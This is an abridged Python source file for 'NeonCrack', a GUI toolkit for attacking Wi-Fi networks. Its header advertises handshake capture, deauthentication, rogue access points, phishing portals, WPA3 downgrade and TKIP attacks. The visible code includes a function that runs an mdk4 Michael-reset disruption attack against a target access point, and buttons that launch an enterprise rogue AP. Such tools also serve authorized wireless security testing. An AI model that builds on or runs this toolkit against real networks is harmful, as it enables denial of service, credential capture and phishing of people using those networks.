#!/usr/bin/env python3
"""
NeonCrack v3.6.6 – cyber-punk Wi-Fi & network toolkit
─────────────────────────────────────────────────────
Baseline features: PMKID, 4-way, WPS, Deauth, Beacon, Mass-PMKID, KARMA,
Dragonblood, nmap panel, bandwidth graph, Sticky-Monitor, Wifiphisher portal.

NEW in v3.6.6
─────────────
• Attacks tab split into           📡 Captures / 🪪 Rogue AP / ⚔️ Disruption / 🛠 Exploits
• Adds six modules:
    – EAPHammer Enterprise Rogue-AP
    – Kr00k-Hunter CVE-2020-3702 test
    – Probe-Response Flood  (mdk4 p)
    – SAE / OWE Downgrade   (wpa_sycophant)
    – TKIP Chop-Chop        (aireplay-ng -4)
    – TKIP Michael Reset    (mdk4 m)

MIT License – see project repo for full terms
"""
...
root = Tk(); root.title("NeonCrack v3.6.6"); root.configure(bg=BGC); root.geometry("1080x850")
...
def start_michael_reset():
    ...
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP", "AP isn’t using TKIP"); return
    set_monitor(iface, True); mon = iface_var.get()
    global attack_proc; attack_proc = run_logged(["mdk4",mon,"m","-t",bssid], att_out)
...
# ── Attack tab (re-structured) --------------------------------------------
ta=tabs["attack"]

# BSSID / ESSID selector
...
Button(lf_rogue,text="EAPHammer Enterprise Rogue-AP",command=start_eaphammer,bg=ACCENT,fg="white").pack(fill=X,pady=1,padx=6)
